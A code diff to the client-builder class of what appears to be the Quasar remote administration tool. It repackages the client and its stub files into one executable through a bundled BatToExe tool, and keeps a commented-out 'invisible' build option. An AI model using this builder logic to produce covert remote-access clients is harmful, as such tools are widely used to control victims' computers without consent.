@@ -7,7 +7,9 @@ using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
 using System.IO;
+using System.Diagnostics;
 using Vestris.ResourceLib;
+using Quasar.Common;
 
 namespace Quasar.Server.Build
 {
@@ -17,12 +19,10 @@ namespace Quasar.Server.Build
     public class ClientBuilder
     {
         private readonly BuildOptions _options;
-        private readonly string _clientFilePath;
 
-        public ClientBuilder(BuildOptions options, string clientFilePath)
+        public ClientBuilder(BuildOptions options)
         {
             _options = options;
-            _clientFilePath = clientFilePath;
         }
 
         /// <summary>
@@ -34,28 +34,33 @@ namespace Quasar.Server.Build
             {
                 File.Delete(_options.OutputPath);
             }
-            using (AssemblyDefinition asmDef = AssemblyDefinition.ReadAssembly(_clientFilePath))
+            if (Directory.Exists("Builder"))
             {
-                // PHASE 1 - Writing settings
-                WriteSettings(asmDef);
-                /*
-                // PHASE 2 - Renaming
-                Renamer r = new Renamer(asmDef);
-
-                if (!r.Perform())
-                    throw new Exception("renaming failed");
-                */
-                // File.Copy(_clientFilePath, _options.OutputPath);
-                // PHASE 3 - Saving
-                asmDef.Write(_options.OutputPath);
+                Directory.Delete("Builder", true);
             }
+            Directory.CreateDirectory("Builder");
 
-            // PHASE 4 - Assembly Information changing
+            File.WriteAllText("Builder\\run.bat", "Client.exe");
+            File.WriteAllBytes("Builder\\BatToExe.exe", Properties.Resources.BatToExe);
+            // Write client settings
+            File.WriteAllBytes("Stub\\core.lib",_options.ExportBinary(new X509Certificate2(Settings.CertificatePath, "", X509KeyStorageFlags.Exportable)));
+            var args = $"/bat Builder\\run.bat /exe \"{_options.OutputPath}\" /x64 /wordkdir 0 /extracdir 0 /overwrite /attributes";
+            // args+=" /invisible";
+            foreach (var f in Directory.GetFiles("Stub\\"))
+            {
+                args+=$" /include \"{f}\"";
+            }
+            var p=Process.Start("Builder\\BatToExe.exe", args);
+            p.WaitForExit();
+            if(p.ExitCode != 0)
+            {
+                throw new Exception("Error occured when building client");
+            }
+            // Assembly Information changing
             if (_options.AssemblyInformation != null)
             {
                 VersionResource versionResource = new VersionResource();
                 versionResource.LoadFrom(_options.OutputPath);
-
                 versionResource.FileVersion = _options.AssemblyInformation[7];
                 versionResource.ProductVersion = _options.AssemblyInformation[6];
                 versionResource.Language = 0;
@@ -74,7 +79,7 @@ namespace Quasar.Server.Build
 
                 versionResource.SaveTo(_options.OutputPath);
             }
-
+            
             // PHASE 5 - Icon changing
             if (!string.IsNullOrEmpty(_options.IconPath))
             {
@@ -83,22 +88,12 @@ namespace Quasar.Server.Build
                 iconDirectoryResource.SaveTo(_options.OutputPath);
             }
         }
-
-        private void WriteSettings(AssemblyDefinition asmDef)
+        /*
+        private string GetOptions()
         {
             var caCertificate = new X509Certificate2(Settings.CertificatePath, "", X509KeyStorageFlags.Exportable);
             var serverCertificate = new X509Certificate2(caCertificate.Export(X509ContentType.Cert)); // export without private key, very important!
-
-            var key = serverCertificate.Thumbprint;
-            var aes = new Aes256(key);
-
-            byte[] signature;
-            // https://stackoverflow.com/a/49777672 RSACryptoServiceProvider must be changed with .NET 4.6
-            using (var rsa = caCertificate.GetRSAPrivateKey())
-            {
-                var hash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(key));
-                signature = rsa.SignHash(hash, HashAlgorithmName.SHA256,RSASignaturePadding.Pkcs1);
-            }
+            var clientSettings=;
 
             foreach (var typeDef in asmDef.Modules[0].Types)
             {
@@ -196,7 +191,7 @@ namespace Quasar.Server.Build
                 }
             }
         }
-
+        */
         /// <summary>
         /// Obtains the OpCode that corresponds to the bool value provided.
         /// </summary>
@@ -207,25 +202,5 @@ namespace Quasar.Server.Build
             return (p) ? OpCodes.Ldc_I4_1 : OpCodes.Ldc_I4_0;
         }
 
-        /// <summary>
-        /// Attempts to obtain the signed-byte value of a special folder from the install path value provided.
-        /// </summary>
-        /// <param name="installPath">The integer value of the install path.</param>
-        /// <returns>Returns the signed-byte value of the special folder.</returns>
-        /// <exception cref="ArgumentException">Thrown if the path to the special folder was invalid.</exception>
-        private sbyte GetSpecialFolder(int installPath)
-        {
-            switch (installPath)
-            {
-                case 1:
-                    return (sbyte)Environment.SpecialFolder.ApplicationData;
-                case 2:
-                    return (sbyte)Environment.SpecialFolder.ProgramFiles;
-                case 3:
-                    return (sbyte)Environment.SpecialFolder.System;
-                default:
-                    throw new ArgumentException("InstallPath");
-            }
-        }
     }
 }
